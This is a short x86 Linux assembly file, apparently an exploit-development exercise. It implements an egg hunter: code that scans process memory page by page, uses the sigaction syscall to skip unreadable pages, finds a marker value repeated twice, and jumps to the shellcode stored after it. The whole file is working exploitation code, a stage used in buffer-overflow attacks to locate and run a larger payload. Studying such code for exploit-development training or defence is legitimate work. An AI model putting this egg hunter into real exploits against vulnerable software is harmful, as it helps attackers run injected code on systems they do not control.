;
; Filename: egg_hunter.asm
; Author:   Fernando Benedictti
; 
;

global _start			

segment .text
_start:
  cld               ; clear direction flag for using with scasd
  xor ecx, ecx
  xor edx, edx

_align_page:
  or cx, 0xfff

_validate_next_address:
  inc ecx
  jnz _execute_sigaction
  inc ecx

_execute_sigaction:
  push 0x43
  pop eax
  int 0x80
  cmp al, 0xf2
  jz _align_page

_validate_egg_pattern:
  mov eax, 0x50905090
  mov edi, ecx
  scasd
  jnz _validate_next_address
  scasd
  jnz _validate_next_address
  jmp edi
